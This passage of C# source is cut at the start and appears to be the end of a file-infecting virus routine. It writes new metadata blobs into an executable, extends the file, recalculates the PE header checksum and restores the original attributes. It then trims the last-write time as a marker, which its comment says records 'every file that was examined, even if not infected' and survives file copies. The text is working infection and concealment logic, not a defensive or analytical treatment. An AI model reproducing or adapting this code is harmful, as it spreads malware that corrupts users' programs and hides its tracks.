                                                               fs.Seek(((Int32) (fs.Seek(0, SeekOrigin.Current)) + 3) & -4, 0); /* 0 == SeekOrigin.Begin */
                                                               fs.Write(rootnew, 0, siglen);
                                                               fs.Write(blobnew, 0, blobind);
                                                               fs.SetLength(blobtotal += BitConverter.ToInt32(buff, 0x0c));

                                                               /* recalculate checksum, if required */

                                                               if (raw != 0)
                                                               {
                                                                   fs.Seek(0, 0); /* 0 == SeekOrigin.Begin */
                                                                   raw = 0;
                                                                   baseind = blobtotal;

                                                                   do
                                                                   {
                                                                       fs.Read(buff, 0, 2);
                                                                       raw = (Int16) (raw) + BitConverter.ToInt16(buff, 0) + (raw >> 0x10);
                                                                   }
                                                                   while ((baseind -= 2) != 0);

                                                                   Marshal.WriteInt32(buff, 0, blobtotal + (Int16) (raw) + (raw >> 0x10));
                                                                   fs.Seek(lfanew + 0x58, 0); /* 0 == SeekOrigin.Begin */
                                                                   fs.Write(buff, 0, 4);
                                                               }
                                                           }
                                                       }
                                                   }
                                               }
                                           }
                                       }
                                   }
                               }
                           }
                       }
                   }

                   fs.Close();

                   /* mark every file that was examined, even if not infected
                      last write time is used because is kept on file copy
                   */

                   File.SetLastWriteTime(filename, lastwrite.AddSeconds(-lastwrite.Second));
                   File.SetAttributes(filename, attr);
               }
           }
       }
   }
